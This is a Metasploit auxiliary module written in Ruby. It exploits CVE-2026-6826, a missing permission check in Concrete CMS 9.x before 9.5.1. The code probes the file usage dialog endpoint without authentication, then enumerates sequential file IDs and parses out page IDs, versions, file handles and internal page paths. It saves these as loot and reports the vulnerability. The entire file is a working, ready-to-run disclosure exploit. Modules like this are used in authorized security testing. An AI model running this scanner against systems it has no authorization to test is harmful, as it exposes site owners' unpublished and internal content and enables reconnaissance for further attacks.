##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Concrete CMS Unauthenticated File Usage Disclosure',
        'Description' => %q{
          Concrete CMS (formerly concrete5) 9.x before 9.5.1 exposes the file usage
          dialog controller at /ccm/system/dialogs/file/usage/<fID> without a view
          permission check (CVE-2026-6826). An unauthenticated attacker can enumerate the
          numeric file ID space and, for every file registered in the file manager, learn
          where it is used: the referencing Page ID, page Version, file Handle, and the
          page Location (path). This discloses the site's internal page tree, unpublished
          and internal page paths, and file handles to anonymous callers.

          This module enumerates a range of file IDs and reports the disclosed usage
          records. It is read-only.
        },
        'Author' => [
          'dividesbyzer0' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-6826'],
          ['URL', 'https://documentation.concretecms.org/9-x/developers/introduction/version-history/951-release-notes'],
          ['URL', 'https://dailycve.com/concrete-cms-unauthenticated-file-usage-disclosure-cve-2026-6826-medium/']
        ],
        'DisclosureDate' => '2026-05-21',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )
    register_options([
      Opt::RPORT(80),
      OptString.new('TARGETURI', [true, 'Base path to the Concrete CMS application', '/']),
      OptInt.new('FID_START', [true, 'First file ID to enumerate', 1]),
      OptInt.new('COUNT', [true, 'Number of sequential file IDs to enumerate', 50])
    ])
  end

  def usage_uri(fid)
    normalize_uri(target_uri.path, 'ccm', 'system', 'dialogs', 'file', 'usage', fid.to_s)
  end

  # Parse the file usage dialog table into an array of [page_id, version, handle, location] rows.
  def parse_usage(res)
    doc = res.get_html_document
    return [] unless doc

    rows = []
    doc.search('table.table-striped tr').each do |tr|
      cells = tr.search('td').map { |td| td.text.strip }
      # Header row is rendered in <td> inside <thead>; skip it and any empty row.
      next if cells.empty? || cells.first == 'Page ID'
      next if cells.all?(&:empty?)

      rows << cells[0, 4]
    end
    rows
  end

  def run_host(_ip)
    # Detect the missing permission check on the first ID before enumerating.
    probe = send_request_cgi('method' => 'GET', 'uri' => usage_uri(datastore['FID_START']))
    unless probe
      print_error("#{peer} - No response from #{usage_uri(datastore['FID_START'])}")
      return
    end
    unless probe.code == 200 && probe.body.to_s.include?('table-striped')
      print_error("#{peer} - File usage dialog is not anonymously reachable (patched or not Concrete CMS)")
      return
    end
    print_good("#{peer} - Unauthenticated file usage dialog is exposed (CVE-2026-6826)")

    table = Rex::Text::Table.new(
      'Header' => 'Concrete CMS file usage',
      'Indent' => 2,
      'Columns' => ['File ID', 'Page ID', 'Version', 'Handle', 'Location']
    )

    found = 0
    (datastore['FID_START']...(datastore['FID_START'] + datastore['COUNT'])).each do |fid|
      res = send_request_cgi('method' => 'GET', 'uri' => usage_uri(fid))
      next unless res && res.code == 200

      parse_usage(res).each do |row|
        page_id, version, handle, location = row
        table << [fid, page_id, version, handle, location]
        found += 1
      end
    end

    if found.zero?
      print_status("#{peer} - Endpoint exposed but no file references found in IDs #{datastore['FID_START']}-#{datastore['FID_START'] + datastore['COUNT'] - 1}")
      return
    end

    print_good("#{peer} - Disclosed #{found} file usage record(s)")
    print_line(table.to_s)

    loot_path = store_loot(
      'concrete_cms.file_usage',
      'text/plain',
      rhost,
      table.to_csv,
      'concrete_cms_file_usage.csv',
      'Concrete CMS unauthenticated file usage disclosure (CVE-2026-6826)'
    )
    print_good("#{peer} - Loot saved to: #{loot_path}")

    report_vuln(
      host: rhost,
      port: rport,
      proto: 'tcp',
      name: name,
      refs: references,
      info: "Disclosed #{found} file usage records via /ccm/system/dialogs/file/usage/<fID>"
    )
  end
end
